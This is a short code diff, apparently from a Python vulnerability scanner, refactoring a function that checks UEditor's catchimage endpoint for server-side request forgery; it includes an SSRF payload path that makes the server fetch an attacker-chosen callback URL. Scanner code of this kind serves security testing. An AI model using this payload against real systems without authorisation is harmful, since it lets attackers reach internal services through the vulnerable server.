@@ -22,13 +22,13 @@ ueditor_ssrf_payloads = [
     {'path': 'net/controller.ashx?action=catchimage&source[]=http://{DNSDOMAIN}/{FILENAME}.jpg'},
 ]
 
-def ssrf_scan(self, clients):
+def ssrf_scan(clients):
     ''' 该接口用于抓取远程图片, 如果没有进行过滤, 则可以请求任意url地址 '''
     client = clients.get('reqClient')
     sessid = 'ed446d2ac00eae0a1aed7c3aa45479d1'
 
     vul_info = {
-        'app_name': self.app_name,
+        'app_name': 'Ueditor',
         'vul_type': 'SSRF',
         'vul_id': 'ueditor-ssrf',
     }
